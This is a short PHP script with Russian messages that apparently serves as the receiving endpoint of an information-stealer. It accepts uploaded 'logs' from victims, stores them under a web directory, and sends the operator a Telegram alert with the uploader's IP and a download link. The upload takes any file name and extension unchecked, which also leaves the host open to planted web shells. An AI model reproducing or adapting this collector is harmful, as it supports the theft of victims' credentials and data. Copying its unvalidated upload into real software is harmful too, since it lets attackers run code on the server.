<?php

$uploaddir = 'logs/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);

$f1 = file_get_contents($_FILES['file']['tmp_name']);
$fd = fopen($uploadfile, 'w') or die("не удалось создать файл");
fwrite($fd, $f1);
fclose($fd);

function GetIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

$ip = GetIP();

define('TELEGRAM_TOKEN', 'token');

define('TELEGRAM_CHATID', 'yourid');

message_to_telegram('Новый лог!
IP: ' .  $ip . '
Скачать: ' . $_SERVER['HTTP_HOST'] . '/' . $uploadfile);

function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}
?>